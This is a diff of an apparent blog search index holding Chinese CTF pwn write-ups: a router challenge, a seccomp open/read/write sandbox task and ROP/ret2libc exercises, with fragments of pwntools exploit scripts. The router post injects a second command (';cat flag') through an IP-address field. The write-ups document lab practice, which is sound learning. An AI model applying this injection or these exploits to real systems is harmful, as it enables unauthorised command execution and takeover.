 <p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
@@ -3632,14 +3632,14 @@ callq 在栈里存放一个8位的返回地址
 <h2 id="刷新三观第一题-bjdctf-2020-router"><a href="#刷新三观第一题-bjdctf-2020-router" class="headerlink" title="刷新三观第一题(bjdctf_2020_router)"></a>刷新三观第一题(bjdctf_2020_router)</h2><p><del>昨天本来已经没想到，但今天更没想到</del></p>
 <p>这是一个考察linux中命令方式的题，直接就不需要IDA查看文件</p>
 <p>Linux中打开，连接靶机</p>
-<p><img src="/img/1643120285905.png" alt="1643120285905"></p>
+<p><img src="/img/1643120285905.png"></p>
 <p>界面就这样，让你选</p>
 <p>我选了1</p>
-<p><img src="/img/1643120297383.png" alt="1643120297383"></p>
+<p><img src="/img/1643120297383.png"></p>
 <p>然后让我输入ip地址，我觉得有猫腻，想到Linux有一个指令用法</p>
 <p><code>命令1+；+命令2</code> 这样的格式两种指令都会执行</p>
 <p>然后我果断;cat flag</p>
-<p><img src="/img/1643120311348.png" alt="1643120311348"></p>
+<p><img src="/img/1643120311348.png"></p>
 <p>哈哈哈，出来了，<del>放在第二页可真是有含金量</del></p>
 <p>下班！</p>
 ]]></content>
@@ -4091,7 +4091,7 @@ warn_on_root = 1
 <li>这两天的hgamectf2022也开始了，题目很新颖，我也学到了不少，但是作为一个pwn手吧，比较丢脸的就是一个pwn题都没做出来，虽然其他方向的题目出了不少，也成功挤进前一百名，但这只是暂时的，我还需要继续努力，把自己的主方向强大起来！</li>
 <li>留个图嘿嘿，最高排到39名好像</li>
 </ul>
-<p><img src="/img/1643119698683.png" alt="1643119698683"></p>
+<p><img src="/img/1643119698683.png"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
 <li>这一周收获还是挺多的，学会了buildozer打包，见识了新的ctf题型，又下了两个新软件，真的是活到老学到老，只有不断的学习，才不会落后，冲冲冲！</li>
 <li>下周好像要开始大一新生的培训了，预计寒假结束还是会给他们进行一个考核赛，这就涉及到需要我们出题，到时候时间会越来越紧，不过这样也过得充实！这个寒假这样过才不算荒废！</li>
@@ -4195,13 +4195,13 @@ char <span class="token operator">*</span>strncpy<span class="token punctuation"
     <content><![CDATA[<span id="more"></span>
 <h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
 <p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
-<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
+<p><img src="/img/1643120343756.png"></p>
 <p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
 <p>于是只好拿网上的图片来看</p>
-<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
+<p><img src="/img/1643120358026.png"></p>
 <p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
 <p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
-<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
+<p><img src="/img/1643120371790.png"></p>
 <p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
 <span class="token comment">#coding=utf-8</span>
@@ -4328,7 +4328,7 @@ int main(void)
 <pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary rop --ropchain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="例题：inndy-rop（假的，只是为了静态编译放这儿的）"><a href="#例题：inndy-rop（假的，只是为了静态编译放这儿的）" class="headerlink" title="例题：inndy_rop（假的，只是为了静态编译放这儿的）"></a>例题：inndy_rop<del>（假的，只是为了静态编译放这儿的）</del></h3><p>32位文件，静态编译，开NX，所以直接</p>
-<p><img src="/img/1643119949088.png" alt="1643119949088"></p>
+<p><img src="/img/1643119949088.png"></p>
 <p> 最后稍作修改 </p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-none"><code class="language-none">from pwn import *
 from struct import pack
@@ -4376,7 +4376,7 @@ shell = payload()
 q.sendline(shell)
 q.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/img/1643119981017.png" alt="1643119981017"></p>
+<p><img src="/img/1643119981017.png"></p>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -4391,13 +4391,13 @@ q.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
     <url>/2021/06256e50.html</url>
     <content><![CDATA[<span id="more"></span>
 <h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p>
-<p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p>
+<p><img src="/img/image-20210625101308461.png"></p>
 <p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p>
-<p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p>
+<p><img src="/img/image-20210625101526643.png"></p>
 <p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p>
-<p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p>
+<p><img src="/img/image-20210625101817170.png"></p>
 <p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p>
-<p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p>
+<p><img src="/img/image-20210625101909489.png"></p>
 <h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -4427,7 +4427,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>脚本一跑，cat flag就得到flag了</p>
-<p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>
+<p><img src="/img/image-20210625105710279.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
